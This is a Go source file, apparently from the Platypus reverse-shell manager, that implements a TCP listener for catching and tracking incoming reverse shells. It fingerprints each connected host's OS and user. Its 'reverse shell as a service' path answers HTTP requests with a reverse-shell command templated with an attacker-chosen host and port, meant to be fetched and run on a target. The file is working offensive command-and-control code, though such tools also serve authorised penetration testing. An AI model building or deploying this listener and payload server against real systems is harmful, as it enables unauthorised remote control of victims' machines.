package context

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/WangYihang/Platypus/lib/util/hash"
	"github.com/WangYihang/Platypus/lib/util/fs"
	"github.com/WangYihang/Platypus/lib/util/log"
	humanize "github.com/dustin/go-humanize"
	"github.com/jedib0t/go-pretty/table"
)

type TCPServer struct {
	Host      string
	Port      uint16
	Clients   map[string](*TCPClient)
	TimeStamp time.Time
	Stopped   chan struct{}
}

func CreateTCPServer(host string, port uint16) *TCPServer {
	return &TCPServer{
		Host:      host,
		Port:      port,
		Clients:   make(map[string](*TCPClient)),
		TimeStamp: time.Now(),
		Stopped:   make(chan struct{}, 1),
	}
}

func (s *TCPServer) Hash() string {
	return hash.MD5(fmt.Sprintf("%s:%d:%s", s.Host, s.Port, s.TimeStamp))
}

func LeftStrip(data string) string {
	var k int = 0
	var v rune
	for k, v = range data {
		if v != '\x20' {
			break
		}
	}
	return data[k:]
}

func GetHostname(host string) string {
	return strings.Split(host, ":")[0]
}

func GetPort(host string, default_port uint16) uint16 {
	pair := strings.Split(host, ":")
	if len(pair) < 2 {
		return default_port
	}
	port, err := strconv.Atoi(pair[len(pair)-1])
	if err != nil {
		return default_port
	}
	return uint16(port)
}

func (s *TCPServer) Run() {
	service := fmt.Sprintf("%s:%d", s.Host, s.Port)
	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
	if err != nil {
		log.Error("Resolve TCP address failed: %s", err)
		Ctx.DeleteServer(s)
		return
	}
	listener, err := net.ListenTCP("tcp", tcpAddr)
	if err != nil {
		log.Error("Listen failed: %s", err)
		Ctx.DeleteServer(s)
		return
	}
	log.Info(fmt.Sprintf("Server running at: %s", s.FullDesc()))

	for {
		select {
		case <-s.Stopped:
			listener.Close()
			return
		default:
			var err error
			conn, err := listener.Accept()
			if err != nil {
				continue
			}
			client := CreateTCPClient(conn)
			log.Info("A new income connection from %s", client.Conn.RemoteAddr())
			// Reverse shell as a service
			buffer := make([]byte, 4)
			client.Conn.SetReadDeadline(time.Now().Add(time.Second * 3))
			client.ReadLock.Lock()
			n, err := client.Conn.Read(buffer)
			client.ReadLock.Unlock()
			client.Conn.SetReadDeadline(time.Time{})
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					log.Error("Not requesting for service")
				} else {
					client.Close()
				}
			}
			if string(buffer[:n]) == "GET " {
				requestURI := client.ReadUntilClean(" ")
				// Read HTTP Version
				client.ReadUntilClean("\r\n")
				httpHost := fmt.Sprintf("%s:%d", s.Host, s.Port)
				for {
					var line = client.ReadUntilClean("\r\n")
					// End of headers
					if line == "" {
						log.Debug("All header read")
						break
					}
					delimiter := ":"
					index := strings.Index(line, delimiter)
					headerKey := line[:index]
					headerValue := LeftStrip(line[index+len(delimiter):])
					if headerKey == "Host" {
						httpHost = headerValue
					}
				}

				// eg:
				//     "/python"        -> {"", "python"}
				//     "/8.8.8.8/1337"        -> {"", "8.8.8.8", "1337"}
				//     "/8.8.8.8/1337/python" -> {"", "8.8.8.8", "1337", "python"}
				target := strings.Split(requestURI, "/")

				// step 1: parse host and port, default set to the platypus listening port currently
				host := GetHostname(httpHost)
				var port uint16
				port = GetPort(httpHost, s.Port)

				if strings.HasPrefix(requestURI, "/") && len(target) > 2 {
					host = target[1]
					// TODO: ensure the format of port is int16
					t, err := strconv.Atoi(target[2])
					port = uint16(t)
					if err != nil {
						log.Debug("Invalid port number: %s", target[2])
					}
				} else {
					log.Debug("Invalid HTTP Request-Line: %s", buffer[:n])
				}

				// step 2: parse language
				// language is the last element of target
				language := strings.Replace(target[len(target)-1], ".", "", -1)
				templateFilename := fmt.Sprintf("lib/template/rsh/%s.tpl", language)
				if language == "" || !fs.FileExists(templateFilename) {
					language = "bash"
				}

				// step 3: read template
				// template rendering in golang tastes like shit,
				// here we will trying to use string replace temporarily.
				// read reverse shell template file from lib/template/rsh/*
				templateFilename = fmt.Sprintf("lib/template/rsh/%s.tpl", language)
				templateContent, _ := ioutil.ReadFile(templateFilename)

				// step 4: render target host and port into template
				renderedContent := string(templateContent)
				renderedContent = strings.Replace(renderedContent, "__HOST__", host, -1)
				renderedContent = strings.Replace(renderedContent, "__PORT__", strconv.Itoa(int(port)), -1)
				command := fmt.Sprintf("%s\n", renderedContent)

				// step 5: generate HTTP response
				client.Write([]byte("HTTP/1.0 200 OK\r\n"))
				client.Write([]byte(fmt.Sprintf("Content-Length: %d\r\n", len(command))))
				client.Write([]byte("\r\n"))
				client.Write([]byte(command))
				client.Close()
				log.Info("RaaS: %s", command)
			} else {
				switch Ctx.BlockSameIP {
				case 1:
					log.Info("BlockSameIP is enabled")
					newclientIP := client.Conn.RemoteAddr().String()
					newclientIP = strings.Split(newclientIP, ":")[0]
					clientExist := false
					for _, client := range s.Clients {
						clientIP := client.Conn.RemoteAddr().String()
						clientIP = strings.Split(clientIP, ":")[0]
						if newclientIP == clientIP {
							clientExist = true
							break
						}
					}
					if clientExist {
						log.Warn("Incoming connection comes from a machine which has already connected.")
						client.Close()
					} else {
						log.Info("New client %s Connected", client.FullDesc())
						s.AddTCPClient(client)
					}
				case 0:
					log.Info("BlockSameIP is disabled")
					log.Info("New client %s Connected", client.FullDesc())
					s.AddTCPClient(client)
				}
			}
		}
	}
}

func (s *TCPServer) AsTable() {
	if len(s.Clients) > 0 {
		t := table.NewWriter()
		t.SetOutputMirror(os.Stdout)
		t.SetTitle(fmt.Sprintf(
			"%s Listening on %s:%d, %d Clients",
			s.Hash(),
			(*s).Host,
			(*s).Port,
			len((*s).Clients),
		))
		t.AppendHeader(table.Row{"Hash", "Network", "OS", "User", "Time", "Group"})

		for chash, client := range s.Clients {
			t.AppendRow([]interface{}{
				chash,
				client.Conn.RemoteAddr().String(),
				client.OS.String(),
				client.User,
				humanize.Time(client.TimeStamp),
				client.Group,
			})

		}
		t.Render()
	} else {
		log.Warn(fmt.Sprintf(
			"[%s] listening on %s:%d, 0 clients",
			s.Hash(),
			(*s).Host,
			(*s).Port,
		))
	}
}

func (s *TCPServer) OnelineDesc() string {
	var buffer bytes.Buffer
	buffer.WriteString(
		fmt.Sprintf(
			"%s:%d (%d online clients)",
			s.Host,
			s.Port,
			len(s.Clients),
		),
	)
	return buffer.String()
}

func (s *TCPServer) FullDesc() string {
	var buffer bytes.Buffer
	buffer.WriteString(
		fmt.Sprintf(
			"[%s] %s:%d (%d online clients) (started at: %s)",
			s.Hash(),
			s.Host,
			s.Port,
			len(s.Clients),
			humanize.Time(s.TimeStamp),
		),
	)
	var descs []string
	for _, client := range s.Clients {
		descs = append(descs, fmt.Sprintf("\t%s", client.FullDesc()))
	}
	if len(descs) > 0 {
		buffer.WriteString("\n")
	}
	buffer.WriteString(strings.Join(descs, "\n"))
	return buffer.String()
}

func (s *TCPServer) Stop() {
	log.Info(fmt.Sprintf("Stopping server: %s", s.OnelineDesc()))
	s.Stopped <- struct{}{}

	// Connect to the listener, in order to call listener.Close() immediately
	go func() {
		tmp, _ := net.Dial("tcp", fmt.Sprintf("%s:%d", s.Host, s.Port))
		if tmp != nil {
			tmp.Close()
		}
	}()

	for _, client := range s.Clients {
		s.DeleteTCPClient(client)
	}
}

func (s *TCPServer) AddTCPClient(client *TCPClient) {
	s.Clients[client.Hash] = client
	log.Info("Gathering information from client...")
	client.DetectOS()
	client.DetectUser()
	client.DetectPython()
}

func (s *TCPServer) DeleteTCPClient(client *TCPClient) {
	client.Close()
	delete(s.Clients, client.Hash)
}

func (s *TCPServer) GetAllTCPClients() map[string](*TCPClient) {
	return s.Clients
}
